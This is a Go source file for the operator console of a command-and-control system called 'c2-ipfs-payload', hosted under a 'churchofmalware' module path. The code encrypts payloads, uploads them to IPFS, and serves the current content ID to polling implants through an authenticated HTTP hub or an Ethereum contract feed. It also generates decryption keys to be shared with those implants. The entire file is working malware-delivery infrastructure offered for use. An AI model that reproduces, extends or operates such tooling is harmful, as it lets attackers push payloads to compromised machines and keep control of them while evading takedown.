// Command server is the operator console for the C2 IPFS payload delivery system.
//
// MODE A — Simple HTTP CID Hub:
//   Runs a lightweight HTTP server that serves new CIDs.
//   Implants poll GET /cid for the current CID.
//
// MODE B — Smart Contract CID Feed (optional, requires go-ethereum):
//   Build with: go build -tags ethereum ./cmd/server
//   Interacts with an Ethereum smart contract that emits NewCID events.
package main

import (
	"bufio"
	"encoding/hex"
	"encoding/json"
	"flag"
	"fmt"
	"log"
	"net/http"
	"os"
	"os/signal"
	"strings"
	"sync"
	"syscall"
	"time"

	"github.com/churchofmalware/c2-ipfs-payload/pkg/auth"
	"github.com/churchofmalware/c2-ipfs-payload/pkg/crypto"
	"github.com/churchofmalware/c2-ipfs-payload/pkg/ipfs"
	"github.com/churchofmalware/c2-ipfs-payload/pkg/types"
)

// Server state.
type Server struct {
	mu         sync.RWMutex
	currentCID string
	history    []types.CIDEntry
	startTime  time.Time
	mode       string // "http" or "contract"
	ipfsClient *ipfs.Client
	encKey     []byte
	config     Config

	// For contract mode
	contractAddress string
	rpcURL          string
}

// Config holds server configuration flags.
type Config struct {
	port            int
	username        string
	password        string
	jwtToken        string
	mode            string
	ipfsAPI         string
	pinataJWT       string
	encKeyHex       string
	contractAddr    string
	rpcURL          string
	maxHistory      int
}

func (s *Server) addHistory(cid, note string) {
	s.mu.Lock()
	defer s.mu.Unlock()
	entry := types.CIDEntry{
		CID:       cid,
		Timestamp: time.Now().UTC(),
		Note:      note,
	}
	s.history = append(s.history, entry)
	if len(s.history) > s.config.maxHistory {
		s.history = s.history[len(s.history)-s.config.maxHistory:]
	}
	s.currentCID = cid
}

// --- HTTP Handlers (Mode A) ---

func (s *Server) handleGetCID(w http.ResponseWriter, r *http.Request) {
	s.mu.RLock()
	cid := s.currentCID
	s.mu.RUnlock()

	if cid == "" {
		http.Error(w, `{"error":"no CID set"}`, http.StatusNotFound)
		return
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]string{"cid": cid})
}

func (s *Server) handlePostCID(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}

	var req struct {
		CID  string `json:"cid"`
		Note string `json:"note,omitempty"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, fmt.Sprintf(`{"error":"invalid JSON: %s"}`, err), http.StatusBadRequest)
		return
	}

	req.CID = strings.TrimSpace(req.CID)
	if !ipfs.IsValidCID(req.CID) {
		http.Error(w, `{"error":"invalid CID format"}`, http.StatusBadRequest)
		return
	}

	s.addHistory(req.CID, req.Note)

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]string{
		"status": "ok",
		"cid":    req.CID,
	})
}

func (s *Server) handleHistory(w http.ResponseWriter, r *http.Request) {
	s.mu.RLock()
	history := make([]types.CIDEntry, len(s.history))
	copy(history, s.history)
	s.mu.RUnlock()

	w.Header().Set("Content-Type", "application/json")
	if history == nil {
		w.Write([]byte("[]"))
		return
	}
	json.NewEncoder(w).Encode(history)
}

func (s *Server) handleStatus(w http.ResponseWriter, r *http.Request) {
	s.mu.RLock()
	cid := s.currentCID
	history := make([]types.CIDEntry, len(s.history))
	copy(history, s.history)
	s.mu.RUnlock()

	resp := types.StatusResponse{
		CurrentCID: cid,
		History:    history,
		Mode:       s.mode,
		Uptime:     time.Since(s.startTime).Round(time.Second).String(),
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(resp)
}

// --- Operator Console ---

func (s *Server) runConsole() {
	scanner := bufio.NewScanner(os.Stdin)
	fmt.Println()
	fmt.Println("╔══════════════════════════════════════════╗")
	fmt.Println("║   C2 IPFS Payload — Operator Console     ║")
	fmt.Println("╚══════════════════════════════════════════╝")
	fmt.Printf("Mode: %s | Port: %d\n", strings.ToUpper(s.mode), s.config.port)
	if s.mode == "http" {
		fmt.Printf("CID Hub: http://0.0.0.0:%d/cid\n", s.config.port)
	}
	fmt.Println()
	fmt.Println("Commands:")
	fmt.Println("  deploy <payload>   — Encrypt, upload to IPFS, update CID")
	fmt.Println("  cid <new-cid>      — Manually set CID")
	fmt.Println("  encrypt <file>     — Encrypt a file, upload to IPFS, show CID")
	fmt.Println("  status             — Show current state")
	fmt.Println("  history            — Show recent CID history")
	fmt.Println("  genkey             — Generate a new encryption key")
	fmt.Println("  help               — Show this help")
	fmt.Println("  exit               — Shutdown")
	fmt.Println()

	for {
		fmt.Print("> ")
		if !scanner.Scan() {
			break
		}
		line := strings.TrimSpace(scanner.Text())
		if line == "" {
			continue
		}

		parts := strings.Fields(line)
		cmd := parts[0]

		switch cmd {
		case "exit", "quit":
			fmt.Println("Shutting down...")
			os.Exit(0)

		case "help":
			fmt.Println("Commands:")
			fmt.Println("  deploy <payload>   — Encrypt, upload to IPFS, update CID")
			fmt.Println("  cid <new-cid>      — Manually set CID")
			fmt.Println("  encrypt <file>     — Encrypt a file, upload to IPFS, show CID")
			fmt.Println("  status             — Show current state")
			fmt.Println("  history            — Show recent CID history")
			fmt.Println("  genkey             — Generate a new encryption key")
			fmt.Println("  exit               — Shutdown")

		case "genkey":
			key, err := crypto.GenerateKey()
			if err != nil {
				fmt.Printf("Error: %v\n", err)
				continue
			}
			fmt.Printf("New encryption key: %s\n", key)
			fmt.Println("SAVE THIS KEY. It cannot be recovered.")
			fmt.Println("Share it with implants via --decryption-key")

		case "status":
			s.mu.RLock()
			fmt.Printf("Current CID: %s\n", s.currentCID)
			fmt.Printf("Mode: %s\n", s.mode)
			fmt.Printf("Uptime: %s\n", time.Since(s.startTime).Round(time.Second))
			fmt.Printf("History entries: %d\n", len(s.history))
			fmt.Printf("Contract address: %s\n", s.contractAddress)
			s.mu.RUnlock()

		case "history":
			s.mu.RLock()
			if len(s.history) == 0 {
				fmt.Println("No history.")
			} else {
				fmt.Println("Recent CIDs:")
				for i, entry := range s.history {
					note := entry.Note
					if note == "" {
						note = "(no note)"
					}
					fmt.Printf("  %d. %s [%s] %s\n",
						i+1, entry.CID, entry.Timestamp.Format(time.RFC3339), note)
				}
			}
			s.mu.RUnlock()

		case "cid":
			if len(parts) < 2 {
				fmt.Println("Usage: cid <cid>")
				continue
			}
			newCID := parts[1]
			if !ipfs.IsValidCID(newCID) {
				fmt.Println("Invalid CID format.")
				continue
			}
			note := ""
			if len(parts) > 2 {
				note = strings.Join(parts[2:], " ")
			}
			s.addHistory(newCID, note)
			fmt.Printf("CID updated to: %s\n", newCID)

		case "encrypt":
			if len(parts) < 2 {
				fmt.Println("Usage: encrypt <file>")
				continue
			}
			filePath := parts[1]
			s.cmdEncrypt(filePath)

		case "deploy":
			if len(parts) < 2 {
				fmt.Println("Usage: deploy <payload>")
				continue
			}
			filePath := parts[1]
			s.cmdDeploy(filePath)

		default:
			fmt.Printf("Unknown command: %s. Type 'help'\n", cmd)
		}
	}
}

func (s *Server) cmdEncrypt(filePath string) {
	data, err := os.ReadFile(filePath)
	if err != nil {
		fmt.Printf("Error reading file: %v\n", err)
		return
	}

	encrypted, err := crypto.Encrypt(data, s.encKey)
	if err != nil {
		fmt.Printf("Error encrypting: %v\n", err)
		return
	}

	// Extract filename without path
	fileName := filePath
	if idx := strings.LastIndex(filePath, "/"); idx >= 0 {
		fileName = filePath[idx+1:]
	}
	encName := fileName + ".enc"

	// Upload to IPFS
	fmt.Printf("Uploading encrypted payload (%d bytes) to IPFS...\n", len(encrypted))
	resp, err := s.ipfsClient.Upload(encrypted, encName)
	if err != nil {
		fmt.Printf("IPFS upload failed: %v\n", err)
		fmt.Println("Encrypted file saved locally as:", encName)
		os.WriteFile(encName, encrypted, 0644)
		fmt.Println("Use 'ipfs add' or Pinata to upload manually, then 'cid <cid>' to set it.")
		return
	}

	fmt.Printf("Uploaded! CID: %s\n", resp.CID)
	fmt.Printf("Local copy: %s\n", encName)
	os.WriteFile(encName, encrypted, 0644)
	fmt.Println()
	fmt.Println("To deploy, run: cid", resp.CID)
}

func (s *Server) cmdDeploy(filePath string) {
	data, err := os.ReadFile(filePath)
	if err != nil {
		fmt.Printf("Error reading payload: %v\n", err)
		return
	}

	encrypted, err := crypto.Encrypt(data, s.encKey)
	if err != nil {
		fmt.Printf("Error encrypting payload: %v\n", err)
		return
	}

	fileName := filePath
	if idx := strings.LastIndex(filePath, "/"); idx >= 0 {
		fileName = filePath[idx+1:]
	}
	encName := fileName + ".enc"

	fmt.Printf("Encrypted %s (%d bytes raw -> %d bytes encrypted)\n", filePath, len(data), len(encrypted))
	fmt.Println("Uploading to IPFS...")

	resp, err := s.ipfsClient.Upload(encrypted, encName)
	if err != nil {
		fmt.Printf("IPFS upload failed: %v\n", err)
		return
	}

	s.addHistory(resp.CID, "deploy: "+fileName)

	fmt.Printf("✅ Deployed!\n")
	fmt.Printf("   Payload: %s\n", filePath)
	fmt.Printf("   Encrypted: %s\n", encName)
	fmt.Printf("   IPFS CID: %s\n", resp.CID)
	fmt.Printf("   Size: %d bytes\n", len(encrypted))

	if s.mode == "contract" {
		if s.contractAddress != "" {
			fmt.Println()
			fmt.Println("To send CID to contract:")
			fmt.Printf("   > send-cid %s %s\n", s.contractAddress, resp.CID)
			fmt.Println("(Requires --rpc-url and go-ethereum build)")
		}
	}
}

// --- HTTP Server ---

func (s *Server) startHTTPServer() {
	if s.mode != "http" {
		return
	}

	mux := http.NewServeMux()

	// Apply auth middleware based on config
	var getCIDHandler http.HandlerFunc = s.handleGetCID
	var postCIDHandler http.HandlerFunc = s.handlePostCID
	var historyHandler http.HandlerFunc = s.handleHistory
	var statusHandler http.HandlerFunc = s.handleStatus

	if s.config.jwtToken != "" {
		getCIDHandler = auth.JWTAuth(s.config.jwtToken, s.handleGetCID)
		postCIDHandler = auth.JWTAuth(s.config.jwtToken, s.handlePostCID)
		historyHandler = auth.JWTAuth(s.config.jwtToken, s.handleHistory)
		statusHandler = auth.JWTAuth(s.config.jwtToken, s.handleStatus)
	} else {
		getCIDHandler = auth.BasicAuth(s.config.username, s.config.password, getCIDHandler)
		postCIDHandler = auth.BasicAuth(s.config.username, s.config.password, postCIDHandler)
		historyHandler = auth.BasicAuth(s.config.username, s.config.password, historyHandler)
		statusHandler = auth.BasicAuth(s.config.username, s.config.password, statusHandler)
	}

	mux.HandleFunc("/cid", func(w http.ResponseWriter, r *http.Request) {
		switch r.Method {
		case http.MethodGet:
			getCIDHandler(w, r)
		case http.MethodPost:
			postCIDHandler(w, r)
		default:
			http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		}
	})
	mux.HandleFunc("/history", historyHandler)
	mux.HandleFunc("/status", statusHandler)
	mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		info := map[string]interface{}{
			"service": "c2-ipfs-payload",
			"version": "1.0.0",
			"mode":    s.mode,
			"auth":    s.config.jwtToken != "" || s.config.username != "",
			"endpoints": map[string]string{
				"GET  /cid":     "Get current CID",
				"POST /cid":     "Set a new CID (body: {\"cid\":\"...\"})",
				"GET  /history": "Get recent CID history",
				"GET  /status":  "Get server status",
			},
		}
		json.NewEncoder(w).Encode(info)
	})

	addr := fmt.Sprintf("0.0.0.0:%d", s.config.port)
	log.Printf("CID Hub listening on %s (mode A — HTTP)", addr)
	if err := http.ListenAndServe(addr, mux); err != nil {
		log.Fatalf("Server failed: %v", err)
	}
}

func main() {
	// Flags
	cfg := Config{}
	flag.IntVar(&cfg.port, "port", 8443, "HTTP server port (mode A)")
	flag.StringVar(&cfg.username, "user", "", "Basic auth username (mode A)")
	flag.StringVar(&cfg.password, "pass", "", "Basic auth password (mode A)")
	flag.StringVar(&cfg.jwtToken, "jwt", "", "JWT token for auth (mode A, overrides basic auth)")
	flag.StringVar(&cfg.mode, "mode", "http", "Operation mode: 'http' or 'contract'")
	flag.StringVar(&cfg.ipfsAPI, "ipfs-api", "http://127.0.0.1:5001/api/v0", "IPFS API URL (for local daemon uploads)")
	flag.StringVar(&cfg.pinataJWT, "pinata-jwt", "", "Pinata.cloud JWT (alternative IPFS upload)")
	flag.StringVar(&cfg.encKeyHex, "enc-key", "", "Encryption key (32-byte hex, auto-generates if empty)")
	flag.StringVar(&cfg.contractAddr, "contract", "", "Smart contract address (mode B)")
	flag.StringVar(&cfg.rpcURL, "rpc-url", "", "Ethereum RPC URL (mode B)")
	flag.IntVar(&cfg.maxHistory, "max-history", 100, "Maximum history entries to keep")
	flag.Parse()

	// Encryption key
	var encKey []byte
	if cfg.encKeyHex != "" {
		var err error
		encKey, err = hex.DecodeString(cfg.encKeyHex)
		if err != nil {
			log.Fatalf("Invalid encryption key hex: %v", err)
		}
		if len(encKey) != crypto.KeySize {
			log.Fatalf("Encryption key must be %d bytes hex (got %d)", crypto.KeySize, len(encKey))
		}
		fmt.Printf("Using provided encryption key: %s...%s\n",
			cfg.encKeyHex[:8], cfg.encKeyHex[len(cfg.encKeyHex)-8:])
	} else {
		keyHex, err := crypto.GenerateKey()
		if err != nil {
			log.Fatalf("Failed to generate key: %v", err)
		}
		encKey, _ = hex.DecodeString(keyHex)
		fmt.Printf("Generated new encryption key: %s\n", keyHex)
		fmt.Println("⚠️  SAVE THIS KEY. Share with implants via --decryption-key")
		fmt.Println()
	}

	// IPFS client
	ipfsClient := ipfs.NewClient(cfg.ipfsAPI, cfg.pinataJWT)

	server := &Server{
		startTime:       time.Now(),
		mode:            cfg.mode,
		ipfsClient:      ipfsClient,
		encKey:          encKey,
		config:          cfg,
		contractAddress: cfg.contractAddr,
		rpcURL:          cfg.rpcURL,
		history:         make([]types.CIDEntry, 0, cfg.maxHistory),
	}

	// Start console
	go server.runConsole()

	// Start HTTP server (mode A only; mode B uses console-only for contract ops)
	if cfg.mode == "http" {
		go server.startHTTPServer()
	} else if cfg.mode == "contract" {
		log.Printf("Running in contract mode — no HTTP CID hub.")
		log.Printf("Use 'send-cid' command (build with -tags ethereum) to emit CIDs to contract.")
		fmt.Printf("Contract address: %s\n", cfg.contractAddr)
		fmt.Printf("RPC URL: %s\n", cfg.rpcURL)
	} else {
		log.Fatalf("Unknown mode: %s (use 'http' or 'contract')", cfg.mode)
	}

	// Wait for signal
	sigCh := make(chan os.Signal, 1)
	signal.Notify(sigCh, syscall.SIGINT, syscall.SIGTERM)
	<-sigCh
	fmt.Println("\nShutting down...")
}
